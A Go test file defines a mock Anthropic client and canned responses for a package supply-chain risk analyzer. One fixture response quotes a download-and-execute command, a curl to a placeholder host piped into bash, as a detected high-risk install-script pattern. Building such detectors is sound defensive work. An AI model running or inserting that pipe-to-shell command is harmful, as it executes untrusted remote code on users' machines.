package ai

import (
	"context"
	"fmt"

	"github.com/anthropics/anthropic-sdk-go"
)

// MockClient is a mock implementation for testing
// It implements the necessary methods to replace a real Client in tests
type MockClient struct {
	// MockResponses is a list of canned responses to return
	MockResponses []*anthropic.Message

	// MockError is the error to return (if non-nil)
	MockError error

	// CallCount tracks how many times CreateMessage was called
	CallCount int

	// LastParams captures the last parameters passed
	LastParams *anthropic.MessageNewParams

	// ResponseIndex tracks which response to return next
	ResponseIndex int
}

// NewMockClient creates a new mock client
func NewMockClient() *MockClient {
	return &MockClient{
		MockResponses: []*anthropic.Message{},
		CallCount:     0,
		ResponseIndex: 0,
	}
}

// CreateMessage implements a mock CreateMessage method
func (m *MockClient) CreateMessage(ctx context.Context, params anthropic.MessageNewParams) (*anthropic.Message, error) {
	m.CallCount++
	m.LastParams = &params

	// If error is set, return it
	if m.MockError != nil {
		return nil, m.MockError
	}

	// If no responses set, return default
	if len(m.MockResponses) == 0 {
		return createMockMessage("Mock response"), nil
	}

	// Return next response
	if m.ResponseIndex >= len(m.MockResponses) {
		m.ResponseIndex = len(m.MockResponses) - 1
	}

	resp := m.MockResponses[m.ResponseIndex]
	m.ResponseIndex++

	return resp, nil
}

// Close implements cleanup
func (m *MockClient) Close() error {
	return nil
}

// WithResponse adds a canned text response
func (m *MockClient) WithResponse(text string) *MockClient {
	m.MockResponses = append(m.MockResponses, createMockMessage(text))
	return m
}

// WithError sets an error to return
func (m *MockClient) WithError(err error) *MockClient {
	m.MockError = err
	return m
}

// WithMessage adds a complete message response
func (m *MockClient) WithMessage(msg *anthropic.Message) *MockClient {
	m.MockResponses = append(m.MockResponses, msg)
	return m
}

// Reset resets the mock client state
func (m *MockClient) Reset() {
	m.CallCount = 0
	m.ResponseIndex = 0
	m.LastParams = nil
	m.MockResponses = []*anthropic.Message{}
	m.MockError = nil
}

// Helper to create a mock message
func createMockMessage(text string) *anthropic.Message {
	return &anthropic.Message{
		ID:    "mock-msg-123",
		Model: anthropic.ModelClaudeSonnet4_5_20250929,
		Content: []anthropic.ContentBlockUnion{{
			Type: "text",
			Text: text,
		}},
		Usage: anthropic.Usage{
			InputTokens:  100,
			OutputTokens: 50,
		},
	}
}

// ==================== Mock Response Builders ====================

// CreateSemanticAnalysisResponse creates a realistic semantic analysis response
func CreateSemanticAnalysisResponse(hasRisks bool) *anthropic.Message {
	var text string

	if hasRisks {
		text = "## Semantic Analysis Results\n\n" +
			"**Pattern Detected: Network Download**\n\n" +
			"The install script contains suspicious network access patterns:\n\n" +
			"```bash\n" +
			"curl -sL https://example.com/script.sh | bash\n" +
			"```\n\n" +
			"**Risk Level: HIGH**\n\n" +
			"**Justification:**\n" +
			"This pattern downloads and executes code from an external source, bypassing package registry audits.\n\n" +
			"**Academic Source:**\n" +
			"Backstabber's Knife Collection (Ohm et al., 2020)\n\n" +
			"**Evidence:**\n" +
			"`curl -sL https://example.com/script.sh | bash` - Downloads and executes shell script.\n"
	} else {
		text = "## Semantic Analysis Results\n\n" +
			"No risky patterns detected in the install script.\n\n" +
			"The script appears benign.\n"
	}

	return createMockMessage(text)
}

// CreateAttackPatternResponse creates a realistic attack pattern matching response
func CreateAttackPatternResponse(hasMatches bool) *anthropic.Message {
	var text string

	if hasMatches {
		text = "## Attack Pattern Analysis\n\n" +
			"### Pattern Match: Malicious Install Script\n\n" +
			"**Confidence: 0.85**\n\n" +
			"**Severity: HIGH**\n\n" +
			"**Description:**\n" +
			"Similar to event-stream attack (2018)\n\n" +
			"**Evidence:**\n" +
			"- Install scripts contain network download patterns\n" +
			"- Single maintainer with full control\n\n" +
			"**Academic Source:**\n" +
			"Backstabber's Knife Collection (Ohm et al., 2020)\n"
	} else {
		text = "## Attack Pattern Analysis\n\n" +
			"No significant matches to known historical attack patterns.\n"
	}

	return createMockMessage(text)
}

// CreateExecutiveExplanationResponse creates a realistic executive explanation response
func CreateExecutiveExplanationResponse(riskLevel string) *anthropic.Message {
	var text string

	switch riskLevel {
	case "HIGH":
		text = "## Executive Summary\n\n" +
			"This package poses significant supply chain security risks.\n\n" +
			"## Business Impact\n\n" +
			"- Data Breach Risk\n" +
			"- System Compromise\n\n" +
			"## Recommendations\n\n" +
			"Do not use this package in production.\n\n" +
			"## Technical Explanation\n\n" +
			"Install scripts execute arbitrary code during installation.\n"
	case "MEDIUM":
		text = "## Executive Summary\n\n" +
			"This package has moderate supply chain risks.\n\n" +
			"## Recommendations\n\n" +
			"Review before production deployment.\n"
	default: // LOW
		text = "## Executive Summary\n\n" +
			"This package demonstrates good security practices.\n\n" +
			"## Recommendations\n\n" +
			"Proceed with standard adoption process.\n"
	}

	return createMockMessage(text)
}

// CreateQuickSummaryResponse creates a concise summary response
func CreateQuickSummaryResponse(riskScore int) *anthropic.Message {
	var text string

	if riskScore >= 70 {
		text = "High supply chain risk detected. Single maintainer with dangerous install scripts. Recommend alternatives."
	} else if riskScore >= 40 {
		text = "Moderate risk. Limited maintainer diversity. Consider alternatives or monitoring."
	} else {
		text = "Low risk. Good security practices. Suitable for production."
	}

	return createMockMessage(text)
}

// CreateRateLimitError creates a rate limit error
func CreateRateLimitError() error {
	return fmt.Errorf("rate limit exceeded")
}

// CreateServerError creates a server error
func CreateServerError() error {
	return fmt.Errorf("internal server error")
}

// CreateContextCancelledError creates a context cancelled error
func CreateContextCancelledError() error {
	return context.Canceled
}
